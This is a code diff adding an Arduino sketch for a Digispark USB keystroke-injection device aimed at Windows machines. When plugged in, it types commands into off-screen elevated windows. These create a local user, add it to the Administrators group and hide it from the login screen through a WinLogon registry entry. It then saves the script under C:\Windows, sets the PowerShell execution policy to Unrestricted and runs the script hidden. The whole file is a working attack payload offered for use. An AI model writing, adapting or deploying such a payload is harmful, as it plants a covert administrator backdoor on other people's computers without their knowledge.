@@ -1,0 +1,69 @@
+#include <DigiKeyboard.h>
+
+void setup() {
+  //empty
+}
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
+  delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  delay(500);
+  DigiKeyboard.print("powershell Start-Process notepad -Verb runAs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  delay(750);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_GUI_LEFT);
+  delay(750);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
+  delay(1000);
+  DigiKeyboard.print("m");
+  delay(1000);
+ 
+  for(int i = 0; i < 100; i++) {
+    DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
+  }
+  
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("Net User LetJusticeBeDoneThoughTheHeavenFalls Eto /ADD");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("Net LocalGroup Administrators Eto /ADD");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  delay(500);
+  DigiKeyboard.print("reg add 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\\SpecialAccounts\\UserList' /v Eto /t REG_DWORD /d 0 /f");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("Remove-Item $MyINvocation.InvocationName");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_CONTROL_LEFT);
+  delay(1000);
+  DigiKeyboard.print("C:\\Windows\\config-99788.psl");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
+  delay(750);
+  DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  delay(1000);
+  DigiKeyboard.print("mode con:cols=14 lines=1");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
+  delay(750);
+  DigiKeyboard.print("m");
+  delay(750);
+  
+  for(int i = 0; i < 100; i++) {
+    DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
+  }
+  
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  delay(750);
+  DigiKeyboard.print("powershell.exe -windowstyle hidden -File C:\\Windows\\config-99788.psl");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // End Payload
+    for (;;) {
+    /*Stops the digispark from running the scipt again*/
+  }
+}
